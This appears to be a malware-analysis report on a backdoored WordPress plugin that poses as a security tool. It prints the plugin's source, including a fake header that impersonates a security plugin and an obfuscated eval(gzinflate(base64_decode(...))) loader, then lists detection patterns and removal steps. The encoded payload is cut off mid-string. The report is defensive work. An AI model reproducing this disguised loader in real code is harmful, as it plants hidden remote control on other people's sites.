---
title: 'Hidden Plugin Backdoor'
slug: 'hidden-plugin-backdoor'
reportDate: '2026-01-24'
threatType: 'Backdoor'
severity: 'High'
fileHash: 'wp-security-hidden-plugin'
detectedPaths: ['malware-sample.txt']
screenshots:
  ['/images/wordpress-threats/wp-security-hidden-plugin_evidence-1.png']
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'The malware poses a severe security risk, allowing potential unauthorized access and control. This could lead to data theft, defacement, SEO penalties, and performance issues.'
seenOn: 'wp-content/plugins/wp-security'
behavior: 'Executes hidden backdoor scripts, potentially installing additional malware or stealing data.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: 'The user did not specify the number of sites fixed.'
---

## Technical Analysis

The code in the 'malware-sample.txt' file reveals a hidden backdoor within a WordPress plugin named 'WP-Security'. The plugin's presence in wp-content/plugins but its absence from the dashboard suggests it is intentionally obfuscated to avoid detection by the average user. The code uses functions like `gzinflate`, `base64_decode`, and `eval`, which decode and execute potentially harmful payloads, allowing unauthorized actions on the website. The plugin masquerades as a security tool but runs encrypted malicious scripts.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. The malicious plugin 'WP-Security' is uploaded to the wp-content/plugins directory.
2. Once activated, it uses `gzinflate` and `base64_decode` to decode obfuscated PHP code.
3. The `eval` function executes the decoded script, potentially gaining unauthorized access to the site.

## Code Signature(s)

### FILE: `malware-sample.php`

```php
<?php
/**
 * Plugin Name: WordPress Security
 * Description: Enhance the security of your WordPress site with an advanced and reliable security solution. This plugin offers comprehensive protection against a variety of potential threats, including malware, brute-force attacks, SQL injections, and unauthorized login attempts. With real-time monitoring, firewall defenses, and a proactive malware scanner, your website will stay safeguarded against the latest vulnerabilities.
 * Version: 11.3.1
 * Author: WordPress Security Team
 * Author URI: https://wordpress.org
 * License: GPLv2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: wp-security
 */

eval(gzinflate(base64_decode('DZVFrsUIggSP01Xywkwa9cLPzIyblpmZffr5F8hFKjKyvNLhn/prp2pIj/KfLN1LAvtfUeZzUf7zHy5JBH61ZZ5hq/2zfkxWxTytYiZ8I7lULJgVZRbRyu/+rlS/ShYYZd4R2tIZVpoBa8x1Xqpl4qoFUvdbJo8KRKAydeoq3A5loqDV9uSLc5n8ac+GfjF6xRKQKAvm8y/BVAw9y+suClLBGXdYKRXbPQSXBeQNJrW/31ZAjDXAoSE+O17MONH85hCKELvZ6cyI21IJ+aOkPAGjWxYxUlbEn7+HwU6zfYXKNVJ8gDRWKGAdcOdUhgEuYTlcTpfolywVGY+2HuPXnuH+QWcqGqQGKWV0rOPLG65rR/fTrWhKfFlVccASPI8S+V46Z9cM7w7EhdPzAI9o4I7qgPfMV2/ucnXFWEwOnvQM4fgXEjGltHTs+NP392sZamjdwbM0Zlj35PLIsERuMeumDVBWmcjmOfqeYmcCx0/dTaoWiQsGMW3vjRxEbzQjnkHBJG4D4Q4LcXWzZenXvtPJ3O3xLErBmkG/3mItof8rKHxC67ox/pxixyuGZQKaLcPpWrckJMiAev80X4HnxlUKqQo4coqFuIo5n3SS2VGuORcFv9/FayeqKxfJYTdUFTp5sZ5/Tx1rYZPTkgFkURfaq1mS9CFI74LNwR9Mv/N33HHL2CZ2b1tKrjru7r0orTXl1TyVuc+F+fkNwLFME57aFoH72I/jtJJoR/yK2vu2JKh0g0Oa8ooJxpyr9KWwGz9+YfeR8SbtfJ8O6wBg66mpz6curyAmdIxe22vOSBlUfNGoitdzIXbiBkezFPmDp1R6C2ukYY63e1Opg4xTqCn/AHsWyC+C9X/ZQ1N3MPmYB0AEJazDq3fy/uj6zuivVQMR2sc4enDh62U4C48W59rjzi8W7LEXT9tI2K2qpv0xXwwSDzFRScfajCcFs2YMEasagu8Og4kG8eRvmwFLhH/26EBuDOhGIZ+rIMmsmCJQtt4G7mHcbBK91C1JZSR6ZwL5LQ3bEY0dpOv6QR/mdpG8yWBs7wegpsnoqaldcrqWtArJBiKJd+77QNPkgI3t1ulLqGkhLcrKW6ZOpFGDmGdzjgM7dA1yji/SxJkVV8rEDuaxJoqNSkvDd/W226uyeKOYLRvZWnPuXk9/+ig9om/cwdKloxqw8kfz/DF1a1otJfPz5aoNfqwWCrKM4e7pDC+/lKjd1e6DJyylfaUjez+xk4sxrsgDRmY8tdS6LbYbZSN5LrZPEw8y
```

## Indicators of Compromise (IOCs)

- `gzinflate`
- `base64_decode`
- `eval`

## Removal Protocol

1. Access the server via FTP or cPanel and navigate to the wp-content/plugins directory.
1. Locate and delete the 'WP-Security' plugin folder.
1. Inspect other plugins and themes for suspicious files or similar patterns, and remove them.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
